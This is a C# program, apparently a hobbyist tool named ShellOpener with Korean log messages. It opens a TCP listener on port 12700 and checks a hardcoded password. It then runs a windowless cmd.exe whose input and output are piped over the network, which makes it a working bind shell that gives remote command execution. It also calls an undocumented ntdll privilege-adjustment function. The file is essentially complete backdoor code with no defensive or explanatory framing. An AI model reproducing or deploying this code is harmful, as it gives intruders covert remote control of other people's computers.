using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ShellOpener
{
    class Program
    {
        Socket Listener;
        Socket AccSock;
        string CorrectPass = "Password1";
        StreamReader InputStream;
        StreamWriter OutputStream;
        StreamReader ShellOutput;
        StreamWriter ShellInput;
        Thread ShellThread;
        Thread AccThread;
        Stream NetStream;
        Process Shell;
        static void Main(string[] args)
        {
            RtlAdjustPrivilege(19, true, false, out bool previousValue);
            Console.WriteLine("권한 수정 시도중...");
            IPEndPoint LocalEp = null;
            foreach(IPAddress LocalIP in Dns.GetHostAddresses(Dns.GetHostName()))
            {
                if(LocalIP.AddressFamily == AddressFamily.InterNetwork)
                {
                    LocalEp = new IPEndPoint(LocalIP, 12700);
                    Console.WriteLine("서버가 " + LocalIP + ":12700에 할당됨");
                    break;
                }
            }
            Program program = new Program();
            program.StartListener(LocalEp);
        }

        public void StartListener(IPEndPoint LocalEp)
        {
            Listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            Listener.Bind(LocalEp);
            Listener.Listen(5);
            ThreadStart Ts = new ThreadStart(SocketThread);
            AccThread = new Thread(Ts);
            AccThread.Start();
        }

        public void SocketThread()
        {
            AccSock = Listener.Accept();
            Console.WriteLine("다음 대상이 연결함: " + AccSock.RemoteEndPoint);
            StartRemoteShell();
        }

        public void StartRemoteShell()
        {
            NetStream = new NetworkStream(AccSock);
            InputStream = new StreamReader(NetStream);
            OutputStream = new StreamWriter(NetStream);
            OutputStream.AutoFlush = true;
            while(true)
            {
                string Pass = InputStream.ReadLine();
                if (!Pass.Equals(CorrectPass))
                {
                    OutputStream.WriteLine("Wrong Password");
                    Console.WriteLine("대상이 다음의 비밀번호를 시도했으나 실패함: " + Pass);
                    continue;
                }

                OutputStream.WriteLine("Correct Password");
                Console.WriteLine("대상이 다음의 비밀번호를 시도하여 접속에 성공함: " + Pass);
                break;
            }

            
            Shell = new Process();
            ProcessStartInfo ShellInfo = new ProcessStartInfo("cmd");
            ShellInfo.Arguments = "/b";
            ShellInfo.CreateNoWindow = true;
            ShellInfo.UseShellExecute = false;
            ShellInfo.RedirectStandardError = true;
            ShellInfo.RedirectStandardInput = true;
            ShellInfo.RedirectStandardOutput = true;
            Shell.StartInfo = ShellInfo;
            Shell.Start();
            ShellInput = Shell.StandardInput;
            ShellInput.AutoFlush = true;
            ShellOutput = Shell.StandardOutput;
            OutputStream.WriteLine("Connected");
            Console.WriteLine("셸이 정상적으로 연결됨");
            ThreadStart Ts = new ThreadStart(GetShellInput);
            ShellThread = new Thread(Ts);
            ShellThread.Start();
            GetInput();
        }

        public void GetShellInput()
        {
            try
            {
                string Buf = "";
                OutputStream.Write("\r\n");
                while((Buf = ShellOutput.ReadLine())!=null)
                {
                    Console.WriteLine(Buf);
                    OutputStream.Write(Buf + "\r");
                }
                Drop();
            }
            catch(Exception Ex)
            {
                Console.WriteLine("Exception: " + Ex.StackTrace);
                Drop();
            }
        }

        public void Drop()
        {
            try
            {
                Console.WriteLine("Stream Terminated");
                Shell.Close();
                Shell.Dispose();
                ShellThread.Abort();
                ShellThread = null;
                InputStream.Dispose();
                OutputStream.Dispose();
                ShellInput.Dispose();
                ShellOutput.Dispose();
                Listener.Close();
                AccSock.Close();
                Console.WriteLine("연결 끊김");
                return;
            }
            catch(Exception)
            {
                return;
            }
        }

        public void GetInput()
        {
            try
            {
                string Buf = "";
                while((Buf = InputStream.ReadLine())!=null)
                {
                    Console.WriteLine("명령어 수신됨: " + Buf);
                    HandleCommand(Buf);
                }
            }
            catch(Exception Ex)
            {
                Console.WriteLine("Exception: " + Ex.StackTrace);
                Drop();
            }
        }

        public void HandleCommand(string Command)
        {
            try
            {
                if(Command.Equals("!Exit"))
                {
                    OutputStream.WriteLine("\n\nClosing Shell...");
                    Drop();
                    AccThread.Abort();
                    AccThread = null;
                }
                ShellInput.WriteLine(Command + "\r\n");
            }
            catch(Exception Ex)
            {
                Console.WriteLine("Exception: " + Ex.StackTrace);
            }
        }

        public void Flush()
        {
            NetStream.Dispose();
            InputStream.Dispose();
            OutputStream.Dispose();
            Listener.Close();
            return;
        }
        [DllImport("ntdll.dll")]
        private static extern IntPtr RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
    }
}
